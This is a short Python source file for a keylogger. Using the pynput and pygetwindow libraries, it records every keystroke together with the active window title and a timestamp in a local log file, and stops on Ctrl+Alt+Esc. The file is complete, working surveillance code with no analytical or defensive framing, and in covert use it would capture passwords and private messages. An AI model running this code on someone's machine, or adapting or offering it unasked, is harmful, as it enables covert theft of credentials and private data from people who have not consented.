import logging
import time
import pygetwindow as gw
from pynput import keyboard

# Configure logging
logging.basicConfig(filename=("keylogger.log"), level=logging.DEBUG, format='%(message)s')

# Dictionary to store key names
keyname = {
    keyboard.Key.backspace: "[BACKSPACE]",
    keyboard.Key.enter: "\n",
    keyboard.Key.space: " ",
    keyboard.Key.tab: "[TAB]",
    keyboard.Key.shift: "[SHIFT]",
    keyboard.Key.ctrl: "[CONTROL]",
    keyboard.Key.alt: "[ALT]",
    keyboard.Key.esc: "[ESCAPE]",
    keyboard.Key.home: "[HOME]",
    keyboard.Key.end: "[END]",
    keyboard.Key.left: "[LEFT]",
    keyboard.Key.right: "[RIGHT]",
    keyboard.Key.up: "[UP]",
    keyboard.Key.down: "[DOWN]",
    keyboard.Key.page_up: "[PG_UP]",
    keyboard.Key.page_down: "[PG_DOWN]",
    keyboard.Key.caps_lock: "[CAPSLOCK]"
}

last_window = None
stop_logging = False

# Function to get the current active window title
def get_current_window_title():
    window = gw.getActiveWindow()
    return window.title if window else None

# Function to log key presses
def on_press(key):
    global last_window
    global stop_logging

    if stop_logging:
        return False  # Stop the listener

    current_window = get_current_window_title()
    if current_window != last_window:
        last_window = current_window
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        logging.info(f"\n\n[Window: {current_window} - at {timestamp}] ")
    try:
        if key in keyname:
            logging.info(keyname[key])
        else:
            logging.info(str(key.char))
    except AttributeError:
        logging.info(str(key))

# Function to handle special key combinations
def on_release(key):
    global stop_logging
    # Check if Ctrl + Alt + Esc is pressed
    if key == keyboard.Key.esc and keyboard.Key.ctrl_l in pressed_keys and keyboard.Key.alt_l in pressed_keys:
        stop_logging = True
        return False  # Stop the listener

pressed_keys = set()

def on_press_with_state(key):
    global pressed_keys
    pressed_keys.add(key)
    on_press(key)

def on_release_with_state(key):
    global pressed_keys
    if key in pressed_keys:
        pressed_keys.remove(key)
    on_release(key)

# Start keylogger
def start_keylogger():
    with keyboard.Listener(on_press=on_press_with_state, on_release=on_release_with_state) as listener:
        listener.join()

if __name__ == "__main__":
    print("Starting keylogger...")
    start_keylogger()
